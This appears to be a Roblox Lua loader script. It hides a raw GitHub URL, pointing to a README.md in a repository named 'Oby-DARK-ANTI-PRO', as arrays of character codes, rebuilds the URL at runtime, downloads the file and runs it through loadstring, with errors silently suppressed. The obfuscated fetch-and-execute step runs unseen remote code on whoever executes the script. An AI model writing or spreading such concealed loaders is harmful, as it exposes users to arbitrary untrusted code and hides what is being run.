local x=game:GetService("Players").LocalPlayer
local y=game:GetService("HttpService")
local z={}
local w={}

z[1]={104,116,116,112,115,58,47,47}
z[2]={114,97,119,46,103,105,116,104,117,98}
z[3]={117,115,101,114,99,111,110,116,101,110,116}
z[4]={46,99,111,109,47}
z[5]={97,121,97,100,109,114,109}
z[6]={121,97,100,104,109,114,45,97,108,116}
z[7]={47,79,98,121,45,68,65,82,75}
z[8]={45,65,78,84,73,45,80,82,79}
z[9]={47,114,101,102,115,47,104,101,97,100,115}
z[10]={47,109,97,105,110,47,82,69,65,68,77,69,46,109,100}

for i=1,#z do
    for j=1,#z[i] do
        w[#w+1]=string.char(z[i][j])
    end
end

local full=table.concat(w)

local function run()
    local ok,data=pcall(function()return game:HttpGet(full)end)
    if ok and data then
        local f,e=loadstring(data)
        if f then f() end
    end
end

run()
